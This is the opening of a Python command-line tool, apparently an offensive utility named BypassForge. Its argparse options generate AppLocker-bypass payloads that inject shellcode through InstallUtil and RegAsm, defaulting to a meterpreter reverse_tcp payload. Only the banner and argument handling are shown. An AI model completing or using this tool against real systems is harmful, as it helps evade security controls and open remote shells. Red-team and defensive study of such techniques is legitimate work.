import argparse
from colorama import Fore, Style

def show_banner():
    print(Fore.MAGENTA + Style.BRIGHT + """______                           ______                   
| ___ \\                          |  ___|                  
| |_/ /_   _ _ __   __ _ ___ ___ | |_ ___  _ __ __ _  ___ 
| ___ \\ | | | '_ \\ / _` / __/ __||  _/ _ \\| '__/ _` |/ _ \\
| |_/ / |_| | |_) | (_| \\__ \\__ \\| || (_) | | | (_| |  __/
\\____/ \\__, | .__/ \\__,_|___/___/\\_| \\___/|_|  \\__, |\\___|
        __/ | |                                 __/ |     
       |___/|_|                                |___/      """)
    print()
    print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "Author: Rezur")
    print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "Github Repository: https://github.com/Rezur0x7")
    print()
    
    
show_banner()
parser = argparse.ArgumentParser(description='Generate Payloads utilizing Process Injection techniques for Living-off-the-Land APPLOCKER BYPASS Executables in Windows')

parser.add_argument('--binary', '-b', required=True, dest='binary', help='Specify which Living-off-the-Land binaries to generate payloads for InstallUtil, RegAsm and more to be added later. (use a  comma-separated list. Ex: InstallUtil,RegAsm)')
parser.add_argument('--custom', required=False, default=False, action="store_true", dest='custom',help='Set to specify if custom payload is to be used (specify payload with --hex-shellcode)')
parser.add_argument('--hex-shellcode', required=False, dest='shellcode',help='Specify the shellcode to be run (Shellcode must be in hex format similar to "msfvenom -f hex" output)')
parser.add_argument('--listen-host', '-lh', required=False, metavar='127.0.0.1', dest='lh',help='The listening IP address for MSFVenom payload')
parser.add_argument('--listen-port', '-lp', required=False, metavar='8080',dest='lp',help='The listening port for MSFVenom payload')
parser.add_argument('--payload', required=False, metavar='windows/x64/meterpreter/reverse_tcp', dest='payload',help='The MSF payload to be used')
parser.add_argument('--arch', required=False, dest='arch', choices=['x86', 'x64'], default='x64', help='Specify the architecture (important for .dll payloads), default: x64')
parser.add_argument('--technique', '-t', required=False, dest='injection_technique', default='Shellcode-Loader', choices=['Shellcode-Loader'], help='Specify the Injection Technique (only local Shellcode-Loader present at the moment, more injection techniques to be added), default: Shellcode-Loader')

args = parser.parse_args()

if args.custom and (args.lh or args.lp or args.payload):
    parser.error("Specify either --custom or (-lh, -lp, --payload).")

if args.custom and not args.shellcode:
    parser.error("--hex-shellcode is required when --custom is set.")

if not args.custom and (not args.lh and not args.lp and not args.payload):
    parser.error("Listening host, port and payload are required when custom shellcode is not being used.")

binaries = [binary.strip() for binary in args.binary.split(",")]
injection_technique = args.injection_technique.lower()